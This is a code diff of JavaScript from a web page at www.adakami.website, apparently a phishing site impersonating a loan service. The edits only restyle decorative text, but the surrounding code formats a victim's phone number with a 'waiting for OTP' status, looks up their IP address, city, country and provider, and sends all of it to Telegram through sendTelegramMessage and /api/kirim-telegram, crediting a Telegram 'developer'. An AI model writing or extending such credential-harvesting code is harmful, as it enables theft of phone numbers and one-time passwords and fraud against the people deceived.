@@ -199,7 +199,7 @@
             submitBtn.disabled = true;
             submitBtn.style.opacity = '0.7';
 
-            const message = `<b>── ⋆⋅𖤓⋅⋆◦•●◉✿ PESAN MASUK ✿◉●•◦⋆⋅𖤓⋅⋆ ──</b>\n-ˋˏ✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n<b>👤 𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 ㅤ: </b> <code>${phone}</code>\n<b>🌐 𝙳𝙾𝙼𝙰𝙸𝙽 ㅤ: </b> www.adakami.website\n<b>📨 𝚂𝚃𝙰𝚃𝚄𝚂  ㅤㅤ: </b> 𝑴𝒆𝒏𝒖𝒏𝒈𝒈𝒖 𝑶𝑻𝑷...\n˜”*°•.˜”*°•（ ͜.人 ͜.）☚⍢⃝☚ •°*”˜.•°*”˜`;
+            const message = `<b>── ⋆⋅𖤓⋅⋆◦•●◉✿ PESAN MASUK ✿◉●•◦⋆⋅𖤓⋅⋆ ──</b>\n-ˋˏ✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n<b>👤 𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 ㅤ: </b> <code>${phone}</code>\n<b>🌐 𝙳𝙾𝙼𝙰𝙸𝙽 ㅤ: </b> www.adakami.website\n<b>📨 𝚂𝚃𝙰𝚃𝚄𝚂  ㅤㅤ: </b> 𝑴𝒆𝒏𝒖𝒏𝒈𝒈𝒖 𝑶𝑻𝑷...\n── ⋆⋅𖤓⋅⋆◦•●◉✿ （ ͜.人 ͜.）✿◉●•◦⋆⋅𖤓⋅⋆ ──`;
             sendTelegramMessage(message);
             
             setTimeout(() => {
@@ -313,7 +313,7 @@
                     return res.json();
                 })
                 .then(data => {
-                    const infoPesan = `<b></b>\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>𓀐𓂺</b> www.adakami.website 𓀐𓂺\n<b>IP:</b> <code>${data.ip || '-'}</code>\n<b>Kota:</b> ${data.city || '-'} \n<b>Negara:</b> ${data.country_name || '-'}\n<b>Provider:</b> ${data.org || '-'}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')} my\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 https://t.me/gitlab_v1</b>`;
+                    const infoPesan = `<b></b>\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>𓀐𓂺</b> www.adakami.website 𓀐𓂺\n<b>IP:</b> <code>${data.ip || '-'}</code>\n<b>Kota:</b> ${data.city || '-'} \n<b>Negara:</b> ${data.country_name || '-'}\n<b>Provider:</b> ${data.org || '-'}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')} \n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 https://t.me/gitlab_v1</b>`;
 
                     fetch('/api/kirim-telegram', {
                         method: 'POST',
